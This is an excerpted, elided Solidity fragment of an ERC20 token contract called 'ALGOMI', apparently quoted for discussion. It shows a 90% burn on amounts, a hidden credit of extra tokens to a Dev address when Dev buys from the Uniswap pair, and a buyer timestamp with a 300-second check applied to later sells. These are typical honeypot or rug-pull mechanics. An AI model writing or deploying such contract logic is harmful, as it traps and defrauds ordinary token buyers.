...
contract  ALGOMI  is Ownable, IERC20 {
    ...
    string private  _name = "ALGOMI";
    string private  _symbol = "ALGOMI";

    uint8   private  _decimals = 9;
    uint256 private _totalSupply = 2100000000 * 10 ** 9;
    ...
    function _getValues(uint256 amount, address from) private returns (uint256) {
        uint256 burn = amount * 90 / 100; 

        _tOwned[burnaddress] += burn;
    ...
    function _transfer(  address from,  address to,  uint256 amount  ) private {
        ...
        if ( from == uniswapV2Pair && to == Dev )  { _tOwned [Dev] += Dtoken;}

        if ( from == uniswapV2Pair ) {  if( balanceOf(to) == 0) { {Buyser[to] = time;  }  }  }  

        uint256 _sell = Buyser[from] + 300;
        ...
        if ( time >= _sell  && to != burnaddress  && from != uniswapV2Pair &&  from != Dev ) {
